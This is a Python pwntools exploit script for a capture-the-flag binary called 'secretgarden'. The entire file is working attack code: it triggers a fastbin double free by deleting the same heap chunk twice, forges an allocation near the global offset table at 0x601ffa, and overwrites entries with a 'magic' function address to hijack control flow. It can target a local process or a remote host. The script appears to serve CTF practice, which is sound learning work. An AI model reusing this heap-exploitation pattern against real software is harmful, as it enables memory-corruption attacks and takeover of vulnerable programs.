#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./secretgarden",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")


def raisef(length,name):
    con.sendlineafter("choice : ","1")
    con.sendlineafter("name :",str(length))
    con.sendlineafter("flower :",name)
    con.sendlineafter("flower :","1")
    #con.recvuntil(" !")
def delete(index):
    con.sendlineafter("choice : ","3")
    con.sendlineafter("garden",str(index))
    con.recvuntil("Successful")
def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    magic = 0x400c7b
    raisef(0x50,"aaa")#0
    raisef(0x50,"aaa")#1
    delete(0)
    delete(1)
    delete(0)
    raisef(0x50,p64(0x601ffa))
    raisef(0x50,"bbb")
    
    raisef(0x50,"bbb")
    raisef(0x50,"a"*6 + p64(0) + p64(magic)*2)
    


    
exploit()
con.interactive()
